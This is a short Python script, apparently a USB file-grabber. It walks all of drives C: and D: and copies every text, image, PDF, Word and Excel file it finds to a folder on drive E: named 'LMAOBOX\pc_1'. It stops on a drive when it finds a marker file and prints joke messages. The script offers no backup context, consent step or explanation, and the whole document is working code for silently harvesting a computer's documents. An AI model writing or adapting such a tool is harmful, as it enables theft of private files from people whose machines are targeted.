import shutil, os
from os.path import join
print("oof")
src = ""
dst = "E:\\LMAOBOX\\pc_1"
top = ["C:\\", "D:\\"]
for realTop in top:
    for theDirPath, theDirNames, theFileNames in os.walk(realTop):
        if "1AZN$WAG.txt" in theFileNames:
            print("double oof")
            break
        for file in theFileNames:
            if file.endswith(".txt"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".png"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".pdf"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".jpeg"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".docx"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".xlsx"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".xls"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
a=0
while a < 3: 
    print("(^_^)")
    a+=1
input("Finished")
